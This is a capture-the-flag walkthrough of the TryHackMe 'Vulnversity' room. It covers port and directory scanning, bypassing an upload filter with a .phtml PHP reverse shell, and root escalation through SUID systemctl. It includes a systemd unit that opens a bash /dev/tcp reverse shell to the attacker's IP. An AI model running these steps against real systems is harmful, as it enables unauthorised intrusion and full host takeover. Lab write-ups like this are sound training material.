---
layout: post
title:  "Vulnversity"
categories: tryhackme
---
This room is part walkthrough, part challenge. We're tasked with compromising a host using web-based attacks then escalating privileges to root to obtain the final flag.

*Note the IP of the host changes several times in this writeup due to completing the CTF across a couple of different sessions.*

## Reconnaissance

### nmap

We'll start with a quick TCP scan for all open ports: 

```shell
└─$ sudo nmap -sS -p- 10.10.186.23 -vv
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 09:42 EST
Initiating Ping Scan at 09:42
Scanning 10.10.186.23 [4 ports]
Completed Ping Scan at 09:42, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 09:42
Completed Parallel DNS resolution of 1 host. at 09:42, 0.01s elapsed
Initiating SYN Stealth Scan at 09:42
Scanning 10.10.186.23 [65535 ports]
Discovered open port 445/tcp on 10.10.186.23
Discovered open port 139/tcp on 10.10.186.23
Discovered open port 22/tcp on 10.10.186.23
Discovered open port 21/tcp on 10.10.186.23
Discovered open port 3333/tcp on 10.10.186.23
Discovered open port 3128/tcp on 10.10.186.23
Completed SYN Stealth Scan at 09:42, 19.94s elapsed (65535 total ports)
Nmap scan report for 10.10.186.23
Host is up, received echo-reply ttl 63 (0.025s latency).
Scanned at 2021-02-22 09:42:09 EST for 20s
Not shown: 65529 closed ports
Reason: 65529 resets
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 63
22/tcp   open  ssh          syn-ack ttl 63
139/tcp  open  netbios-ssn  syn-ack ttl 63
445/tcp  open  microsoft-ds syn-ack ttl 63
3128/tcp open  squid-http   syn-ack ttl 63
3333/tcp open  dec-notes    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.13 seconds
           Raw packets sent: 66838 (2.941MB) | Rcvd: 66377 (2.655MB)
```

There are 6 open ports; we can now perform a deeper scan on the ports we identified above to enumerate specific services, versions and anything else of interest:

```shell
└─$ sudo nmap -sS -A -p 21,22,139,445,3128,3333 10.10.186.23    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 09:46 EST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.10.186.23
Host is up (0.024s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Android 5.1 (92%), Linux 3.13 (92%), Linux 3.2 - 3.16 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2021-02-22T09:47:07-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-22T14:47:08
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   26.81 ms 10.9.0.1
2   26.80 ms 10.10.186.23

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.81 seconds
```

The scan has some interesitng findings:
- FTP service: vsftpd 3.0.3
- SSH service: OpenSSH 7.2p2 Ubuntu 4ubuntu2.7
	- Indicates the host may be Ubuntu Linux
- SMB service: Samba smbd 4.3.11-Ubuntu
	- More evidence this host is Ubuntu
- HTTP service: Apache/2.4.18
	- Note this is running on TCP/3333 instead of TCP/80 like we'd usually expect
- HTTP proxy: Squid/3.5.12

SMB enumeration scripts also tell us:
- Hostname & FQDN is `vulnversity`
- Domain name is `\x00`
- The `guest` account is authenticated as `user` - we may be able to enumerate shares as `guest`

### Web Reconnaissance & Gobuster

Since there's a web server running we'll take a look at what it's serving. 

Navigating to the homepage shows a landing page for a university:
![Vulnversity web homepage](/assets/images/vulnversity/vulnversity-01.png)

Unfortunately there's nothing particularly interesting in the source code or when running `whatweb`:

```shell
─$ whatweb http://10.10.186.23:3333/

http://10.10.186.23:3333/ [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[info@yourdomain.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.186.23], JQuery, Script, Title[Vuln University]
```

Instead we'll turn our attention to enumerating web directories with `gobuster` and the wordlist at `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

```shell
└─$ gobuster dir -u http://10.10.153.34:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.153.34:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/02/22 10:52:43 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
/server-status (Status: 403)
===============================================================
2021/02/22 11:02:12 Finished                                                                          
===============================================================     
```

The page at `/internal` gives us an opportunity to upload a file to the server, though we don't yet know where the file will be stored or what file types are allowed:
![Identified upload web page](/assets/images/vulnversity/vulnversity-02.png)

## Exploitation

Let's see if we can upload a PHP reverse shell using the page at `/internal`.

First we'll grab our webshell and modify it with our own IP address & port:

```shell
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
vim shell.php
```
![Modified IP & port variables for PHP webshell](/assets/images/vulnversity/vulnversity-03.png)

Then we'll fire up a netcat listener ready to accept the connection:

`sudo nc -nvlp 443`

![Netcat listening on TCP/443](/assets/images/vulnversity/vulnversity-04.png)

Finally let's upload the webshell and see what happens...

![Upload page showing extension not allowed](/assets/images/vulnversity/vulnversity-05.png)

Looks like files with a `.php` extension aren't allowed. To find out what we *can* upload, we'll need to fuzz the form using Burp Suite.

Using FoxyProxy to quickly proxy browser traffic through Burp, we'll upload the reverse shell again but this time with a goal of intercepting the request for fuzzing:

![Burp Proxy showing intercepted upload request](/assets/images/vulnversity/vulnversity-06.png)

We'll use Intruder to fuzz, so send this intercepted request to Intruder with `Ctrl + I` or by right-clicking.

In Intruder we need to configure the following:

1. Set the payload position to cover the uploaded file extension as this is what we're interested in fuzzing
![Burp Intruder with .$php$ as payload position](/assets/images/vulnversity/vulnversity-07.png)

2. Set the attack type to Sniper - we're only fuzzing a single position
3. Load our payload as a simple list. I'm using `extensions-most-common.fuzz.txt` from [SecLists](https://github.com/danielmiessler/SecLists) which you can clone from the GitHub repo or install with `sudo apt install seclists`, in which case it will be available at `/usr/share/seclists`
![Burp Intruder payload section with list of extensions from SecLists](/assets/images/vulnversity/vulnversity-08.png)

Now we're ready to run the fuzzing attack.

![Results of fuzzing with phtml of length 723 (different from all others)](/assets/images/vulnversity/vulnversity-09.png)

Sort by the length column to reveal that `phtml` has a different response than the rest - so it's likely this is the only file extension which is accepted. Luckily, this is another type of PHP file so our existing webshell will work as long as we modify the extension.

With this information, we can now upload `shell.phtml` after renaming it. Check your netcat listener is still active before uploading and don't forget to turn off the Burp proxy.

![Upload page with success message](/assets/images/vulnversity/vulnversity-10.png)

We now need to find where the file has been uploaded to. At this point we could bust out Gobuster again to look specifically in the `/internal` directory, but a quick guess of `/internal/uploads` reveals this to be correct:

![Visible directory at /internal/uploads with our uploaded webshell](/assets/images/vulnversity/vulnversity-11.png)

Clicking on our webshell causes APache to execute it and we now have a reverse shell as the web server:

![Connection in netcat from reverse shell showing user as www-data](/assets/images/vulnversity/vulnversity-12.png)

## Post-Exploitation: Enumeration

As the `www-data` account, we know we should be able to access what's in `/var/www`. Unfortunately there's not much else of interest in there. 

Next we'll look in `/home` to identify potential user accounts:

```shell
$ ls /home
bill
```

We know there's an account called `bill` on this host - let's see if there are any files we can read in Bill's directory:

```shell
$ ls -la /home/bill
total 24
drwxr-xr-x 2 bill bill 4096 Jul 31  2019 .
drwxr-xr-x 3 root root 4096 Jul 31  2019 ..
-rw-r--r-- 1 bill bill  220 Jul 31  2019 .bash_logout
-rw-r--r-- 1 bill bill 3771 Jul 31  2019 .bashrc
-rw-r--r-- 1 bill bill  655 Jul 31  2019 .profile
-rw-r--r-- 1 bill bill   33 Jul 31  2019 user.txt
```

`user.txt` is world-readable, which gives us the user flag for this room.

### Enumerating Privilege Escalation

We'll need to escalate our privileges (ideally to root) to be able to do anything useful on this host. For Linux, [this is a great starting point](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md).

One area to look at is SUID binaries. If we can exploit a binary owned by `root` with SUID bit set, we can escalate our privileges to root.

To search for these binaries we'll do the following:

```shell
$ find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 49584 May 16  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 32944 May 16  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 136808 Jul  4  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 40432 May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 54256 May 16  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39904 May 16  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root 75304 May 16  2017 /usr/bin/gpasswd
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at
-rwsr-sr-x 1 root root 98440 Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 76408 Jul 17  2019 /usr/lib/squid/pinger
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40128 May 16  2017 /bin/su
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 40152 May 16  2018 /bin/mount
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 27608 May 16  2018 /bin/umount
-rwsr-xr-x 1 root root 659856 Feb 13  2019 /bin/systemctl
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 35600 Mar  6  2017 /sbin/mount.cifs
```

We can use [GTFOBins](https://gtfobins.github.io/#+suid) to check for any binaries that may be able to escalate privileges with the SUID bit set. 

`/bin/systemctl` looks promising:

![systemctl page on GTFOBins website with code to execute to escalate privileges](/assets/images/vulnversity/vulnversity-13.png)

This host allows any user to create a system service and run it as root. So we could create a service that spawns a new reverse shell as root, thus granitng us full access to the host. However in this case we're just interested in reading the final root flag, so we'll get the service to print out its contents instead.

## Post-Exploitation: Privilege Escalation

All we need to do is enter the commands given above, with a slight modification to give the full `systemctl` path:

```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
cat /tmp/output
```

To explain each command:

- First we create an environment variable "TF" assigned to a temporary `systemd` service file
- Now we echo our config into this service file one line at a time
	- *Note the `echo` command doesn't have a closing single quote until line 6, allowing multiple single-line echo inputs*
- First configure the start-up type to be *oneshot*, which is the default
- Next set the command to run on service startup (in this case bash reading the root flag) and output the result into a temporary file
- Set the state at which the service will run to multi-user mode
	- *Note the closing single quote here to end the echo into $TF*
- Now the config file is complete, make it available for `systemctl` with a symlink (as it lives outside the paths `systemctl` will usually search for)
- Finally we enable the service defined in $TF and read the output stored in `/tmp/output`

We've now successfully escalated our privileges to read the final flag file! 

As a bonus, if we wanted to instead spawn a reverse shell as root:

```shell
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<YOUR IP>/444 0>&1"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

*Be sure to listen on TCP/444 (or any other port) since TCP/443 will be taken from our webshell!*